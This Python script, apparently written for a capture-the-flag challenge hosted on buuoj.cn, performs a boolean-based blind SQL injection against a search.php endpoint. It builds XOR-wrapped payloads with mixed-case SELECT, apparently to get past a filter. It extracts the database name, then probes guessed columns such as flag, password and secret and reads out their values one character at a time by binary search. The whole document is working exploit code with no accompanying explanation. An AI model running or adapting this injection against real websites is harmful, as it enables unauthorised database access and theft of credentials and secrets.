#!/usr/bin/env python3
import requests
import time
import string

url = "http://0a24f8a2-89ab-4896-b827-a4e6d5660cda.node5.buuoj.cn:81/search.php"

def check(payload):
    """True = 条件为真(ERROR), False = 条件为假(Clever)"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" in r.text or "Error" in r.text
    except:
        return False

def get_length(query, max_len=100):
    """获取字符串长度"""
    for i in range(1, max_len):
        payload = f"6^(length(({query}))={i})"
        if check(payload):
            return i
    return 0

def get_char_binary(query, pos):
    """二分查找字符"""
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f"6^(ascii(substr(({query}),{pos},1))>{mid})"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low) if 32 <= low <= 126 else ""

def blind_extract(query, name=""):
    """盲注提取数据"""
    length = get_length(query)
    print(f"[*] {name} length: {length}")
    result = ""
    for i in range(1, length + 1):
        c = get_char_binary(query, i)
        result += c
        print(f"    {name}: {result}")
        time.sleep(0.05)
    return result

# 获取数据库名
print("[*] Getting database name...")
db = blind_extract("database()", "Database")

# 测试 id=6 对应的列
print("\n[*] Testing column names...")
columns = ["id", "flag", "fl4g", "password", "username", "user", "pass", "name", "value", "data", "content", "text", "secret"]
for col in columns:
    # 测试列是否存在
    payload = f"6^(length(SeLeCt({col}))>0)"
    if check(payload):
        print(f"    Column '{col}' exists!")
        # 获取该列的值
        value = blind_extract(f"SeLeCt({col})", f"Column '{col}'")
        print(f"    Value: {value}")
    else:
        print(f"    Column '{col}' does not exist or is empty")

